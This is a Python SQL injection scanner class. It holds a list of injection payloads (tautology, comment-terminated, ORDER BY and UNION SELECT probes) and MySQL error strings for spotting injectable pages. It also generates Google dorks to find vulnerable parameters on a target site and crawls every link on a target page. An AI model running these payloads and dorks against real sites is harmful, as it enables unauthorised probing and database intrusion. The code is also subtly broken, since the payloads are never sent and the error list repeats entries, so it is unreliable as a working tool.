import requests
from urllib.parse import urljoin
import re
from typing import List, Dict, Optional

class SQLIScanner:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.vulnerable_params = []
        self.common_sqli_payloads = [
            "'",
            "''",
            "1'1",
            "1=1",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR '1'='1'--",
            "' OR '1'='1' #",
            "' OR '1'='1'/*",
            "') OR ('1'='1",
            "1' ORDER BY 1--",
            "1' ORDER BY 2--",
            "1' ORDER BY 3--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--"
        ]

    def scan_url(self, url: str, params: Dict[str, str] = None) -> bool:
        """
        Scan a single URL for SQL injection vulnerabilities
        """
        try:
            if params:
                response = requests.get(url, params=params)
            else:
                response = requests.get(url)
            
            # Check for common SQL error messages
            error_patterns = [
                "SQL syntax",
                "mysql_fetch_array",
                "mysql_fetch_assoc",
                "mysql_num_rows",
                "mysql_result",
                "mysql_query",
                "mysql error",
                "mysql warning",
                "mysql_connect",
                "mysql_select_db",
                "mysql_list_dbs",
                "mysql_list_tables",
                "mysql_list_fields",
                "mysql_error",
                "mysql_errno",
                "mysql_affected_rows",
                "mysql_insert_id",
                "mysql_close",
                "mysql_free_result",
                "mysql_data_seek",
                "mysql_fetch_row",
                "mysql_fetch_lengths",
                "mysql_fetch_object",
                "mysql_fetch_field",
                "mysql_fetch_field_direct",
                "mysql_fetch_fields",
                "mysql_field_seek",
                "mysql_field_tell",
                "mysql_free_result",
                "mysql_get_client_info",
                "mysql_get_host_info",
                "mysql_get_proto_info",
                "mysql_get_server_info",
                "mysql_info",
                "mysql_insert_id",
                "mysql_num_fields",
                "mysql_num_rows",
                "mysql_pconnect",
                "mysql_ping",
                "mysql_query",
                "mysql_real_escape_string",
                "mysql_result",
                "mysql_select_db",
                "mysql_set_charset",
                "mysql_stat",
                "mysql_thread_id",
                "mysql_warning_count"
            ]
            
            content = response.text.lower()
            for pattern in error_patterns:
                if pattern.lower() in content:
                    return True
                    
            return False
            
        except Exception as e:
            print(f"Error scanning {url}: {str(e)}")
            return False

    def generate_dorks(self) -> List[str]:
        """
        Generate SQL injection dorks for the target
        """
        dorks = []
        base_dorks = [
            f"site:{self.target_url} inurl:php?id=",
            f"site:{self.target_url} inurl:page=",
            f"site:{self.target_url} inurl:cat=",
            f"site:{self.target_url} inurl:file=",
            f"site:{self.target_url} inurl:dir=",
            f"site:{self.target_url} inurl:path=",
            f"site:{self.target_url} inurl:folder=",
            f"site:{self.target_url} inurl:include=",
            f"site:{self.target_url} inurl:inc=",
            f"site:{self.target_url} inurl:view=",
            f"site:{self.target_url} inurl:doc=",
            f"site:{self.target_url} inurl:download=",
            f"site:{self.target_url} inurl:read=",
            f"site:{self.target_url} inurl:show=",
            f"site:{self.target_url} inurl:display="
        ]
        
        for dork in base_dorks:
            dorks.append(dork)
            
        return dorks

    def check_sqli(self) -> List[str]:
        """
        Check for SQL injection vulnerabilities
        """
        vulnerable_urls = []
        
        try:
            response = requests.get(self.target_url)
            if response.status_code == 200:
                # Extract all URLs from the page
                urls = re.findall(r'href=[\'"]?([^\'" >]+)', response.text)
                
                for url in urls:
                    full_url = urljoin(self.target_url, url)
                    if self.scan_url(full_url):
                        vulnerable_urls.append(full_url)
                        
        except Exception as e:
            print(f"Error checking SQL injection: {str(e)}")
            
        return vulnerable_urls 